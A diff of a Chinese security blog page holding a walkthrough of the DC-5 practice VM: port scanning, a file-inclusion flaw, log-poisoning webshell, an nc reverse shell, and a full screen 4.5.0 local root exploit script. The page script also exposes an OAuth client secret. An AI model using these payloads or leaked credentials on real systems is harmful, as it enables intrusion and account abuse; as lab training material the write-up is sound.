@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="靶机,">
 
 
 
@@ -81,16 +81,24 @@
 
 
 
-<meta name="description" content="还有很长的路要走">
-<meta property="og:type" content="website">
-<meta property="og:title" content="prontosil">
-<meta property="og:url" content="https://prontosil.club/tags/nfs/index.html">
+<meta name="description" content="DC 5之前一直没能够确认靶机的ip地址，其实只需要将网络连接模式修改为NAT模式重启一下就行了 123456789101112# root @ kali in ~ [4:06:38] $ arp-scan 192.168.41.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5 with 256">
+<meta name="keywords" content="靶机">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC靶机渗透">
+<meta property="og:url" content="https://prontosil.club/2019/08/09/DC靶机渗透/index.html">
 <meta property="og:site_name" content="prontosil">
-<meta property="og:description" content="还有很长的路要走">
+<meta property="og:description" content="DC 5之前一直没能够确认靶机的ip地址，其实只需要将网络连接模式修改为NAT模式重启一下就行了 123456789101112# root @ kali in ~ [4:06:38] $ arp-scan 192.168.41.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5 with 256">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-0.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-3.png">
+<meta property="og:updated_time" content="2019-08-09T09:14:08.682Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="prontosil">
-<meta name="twitter:description" content="还有很长的路要走">
+<meta name="twitter:title" content="DC靶机渗透">
+<meta name="twitter:description" content="DC 5之前一直没能够确认靶机的ip地址，其实只需要将网络连接模式修改为NAT模式重启一下就行了 123456789101112# root @ kali in ~ [4:06:38] $ arp-scan 192.168.41.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5 with 256">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5.png">
 
 
 
@@ -120,13 +128,13 @@
 
 
 
-  <link rel="canonical" href="https://prontosil.club/tags/nfs/">
+  <link rel="canonical" href="https://prontosil.club/2019/08/09/DC靶机渗透/">
 
 
 
 
 
-  <title>Tag: nfs | prontosil</title>
+  <title>DC靶机渗透 | prontosil</title>
   
 
 
@@ -148,7 +156,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 	<a href="https://github.com/xinyongpeng"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
 
@@ -285,78 +293,250 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>nfs<small>Tag</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/08/09/DC靶机渗透/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="百浪多息">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="prontosil">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2019/08/09/typhoon靶机渗透/" itemprop="url">
-              
-                <span itemprop="name">typhoon靶机渗透</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">DC靶机渗透</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-09T07:30:37+08:00" content="2019-08-09">
-          08-09
-        </time>
-      </div>
+		
 
-    </header>
-  </article>
+        <div class="post-meta">
+         
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-09T16:12:11+08:00">
+                2019-08-09
+              </time>
+            
 
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-08-09T17:14:08+08:00">
+                2019-08-09
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/vulstudy/" itemprop="url" rel="index">
+                    <span itemprop="name">vulstudy</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/08/09/DC靶机渗透/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2019/08/09/DC靶机渗透/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.1k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  5
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        
+      
 
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/07/30/靶机渗透/" itemprop="url">
-              
-                <span itemprop="name">靶机渗透</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-07-30T23:00:04+08:00" content="2019-07-30">
-          07-30
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+      
+        <h2 id="DC-5"><a href="#DC-5" class="headerlink" title="DC 5"></a>DC 5</h2><p>之前一直没能够确认靶机的ip地址，其实只需要将网络连接模式修改为NAT模式重启一下就行了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [4:06:38] </span><br><span class="line">$ arp-scan 192.168.41.0/24</span><br><span class="line">Interface: eth0, datalink type: EN10MB (Ethernet)</span><br><span class="line">Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.41.1	00:50:56:c0:00:08	VMware, Inc.</span><br><span class="line">192.168.41.2	00:50:56:e0:f7:aa	VMware, Inc.</span><br><span class="line">192.168.41.166	00:0c:29:d7:ef:a4	VMware, Inc.</span><br><span class="line">192.168.41.167	00:0c:29:fd:e8:73	VMware, Inc. ---&gt; DC5靶机</span><br><span class="line">192.168.41.254	00:50:56:f5:fb:f6	VMware, Inc.</span><br><span class="line"></span><br><span class="line">5 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.5: 256 hosts scanned in 2.346 seconds (109.12 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure>
+<p>masscan扫出了几个端口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [4:09:46] </span><br><span class="line">$ masscan -p0-65535 192.168.41.167 --rate=1000000</span><br><span class="line"></span><br><span class="line">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-09 08:10:19 GMT</span><br><span class="line"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [65536 ports/host]</span><br><span class="line">Discovered open port 80/tcp on 192.168.41.167                                  </span><br><span class="line">Discovered open port 111/tcp on 192.168.41.167                                 </span><br><span class="line">Discovered open port 33188/tcp on 192.168.41.167</span><br></pre></td></tr></table></figure>
+<p>然后上nmap扫服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [4:10:42] </span><br><span class="line">$ nmap -p80,111,33188 -sV -T4 192.168.41.167</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-09 04:15 EDT</span><br><span class="line">Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 66.67% done; ETC: 04:15 (0:00:06 remaining)</span><br><span class="line">Nmap scan report for 192.168.41.167</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    nginx 1.6.2</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">33188/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:FD:E8:73 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.63 seconds</span><br></pre></td></tr></table></figure>
+<p>访问原始网页：</p>
+<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5.png" alt=""></p>
+<p><code>dirsearch.py</code>似乎没有发现什么</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Target: http://192.168.41.167                                                                                           </span><br><span class="line">[16:24:35] Starting:</span><br><span class="line">[16:24:35] 400 -  172B  - /%2e%2e/google.com</span><br><span class="line">[16:24:42] 301 -  184B  - /css  -&gt;  http://192.168.41.167/css/</span><br><span class="line">[16:24:44] 301 -  184B  - /images  -&gt;  http://192.168.41.167/images/</span><br><span class="line">[16:24:44] 200 -    4KB - /index.php</span><br></pre></td></tr></table></figure>
+<p>看了师傅们的提示，发现footer.php和有趣<br>每次刷新数字都会变化<br><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-0.png" alt=""></p>
+<p>同时发现在 <code>http://192.168.41.167/thankyou.php</code>页面也有这种效果，于是猜想是不是本地文件包含漏洞</p>
+<p>访问<code>http://192.168.41.167/thankyou.php?file=/etc/passwd</code>，页面回显了！</p>
+<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-1.png" alt=""></p>
+<p>同时该主机使用的是nginx服务，于是可以写一个shell到日志中并且包含这个文件</p>
+<p>写入webshell，注意这里使用的是passthru函数</p>
+<blockquote>
+<p>同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-2.png" alt=""></p>
+<p>kali监听一个端口然后访问如下路由去包含文件并且弹shell<br><code>http://192.168.41.167/thankyou.php?file=/var/log/nginx/access.log&amp;cmd=nc%20192.168.41.165%202333%20-c%20/bin/bash</code></p>
+<p>核心命令<code>nc 192.168.41.165 -c /bin/bash</code></p>
+<p>此时的权限是<code>www-data</code><br><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-3.png" alt=""></p>
+<p>接下来看如何提权</p>
+<p>上提权辅助脚本<br><a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" target="_blank" rel="noopener">链接</a><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">发现有这个文件</span><br><span class="line"></span><br><span class="line">![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-4.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exploit-db上搜一下啊exp：</span><br><span class="line"></span><br><span class="line">```sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017) </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"~ gnu/screenroot ~"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] First, we create our shell and library..."</span></span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(<span class="string">"/tmp/rootshell"</span>, 0, 0);</span><br><span class="line">    chmod(<span class="string">"/tmp/rootshell"</span>, 04755);</span><br><span class="line">    unlink(<span class="string">"/etc/ld.so.preload"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] done!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(<span class="string">"/bin/sh"</span>, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Now we create our /etc/ld.so.preload file..."</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">"\x0a/tmp/libhax.so"</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Triggering..."</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure></p>
+<h3 id="DC5后记"><a href="#DC5后记" class="headerlink" title="DC5后记"></a>DC5后记</h3><p>thankyou.php文件中有以下内容；典型的本地文件包含漏洞<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class="footer-wrapper"&gt;</span><br><span class="line">	&lt;footer&gt;</span><br><span class="line">		<span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">			$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">				<span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">include</span>(<span class="string">"$file"</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">include</span>(<span class="string">"footer.php"</span>);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">		<span class="meta">?&gt;</span></span><br><span class="line">	&lt;/footer&gt;</span><br></pre></td></tr></table></figure></p>
 
       
     </div>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/靶机/" rel="tag"># 靶机</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/09/typhoon靶机渗透/" rel="next" title="typhoon靶机渗透">
+                <i class="fa fa-chevron-left"></i> typhoon靶机渗透
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -364,6 +544,17 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+      
+        <div id="gitment-container"></div>
+      
+    </div>
+
+  
+
+
 
         </div>
         
@@ -384,8 +575,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -501,6 +701,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#DC-5"><span class="nav-number">1.</span> <span class="nav-text">DC 5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DC5后记"><span class="nav-number">1.1.</span> <span class="nav-text">DC5后记</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -639,6 +855,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -685,6 +905,30 @@
 
     
 
+    
+      <script type="text/javascript">
+      function renderGitment(){
+        var gitment = new Gitmint({
+            id: window.location.pathname, 
+            owner: 'xinyongpeng',
+            repo: 'gitcomment',
+            
+            lang: "" || navigator.language || navigator.systemLanguage || navigator.userLanguage,
+            
+            oauth: {
+            
+            
+                client_secret: '6504c858cdee4a1f61f0e8c95b1eab199539dc78',
+            
+                client_id: '077d264849f8fc28a574'
+            }});
+        gitment.render('gitment-container');
+      }
+
+      
+      renderGitment();
+      
+      </script>
     
 
 
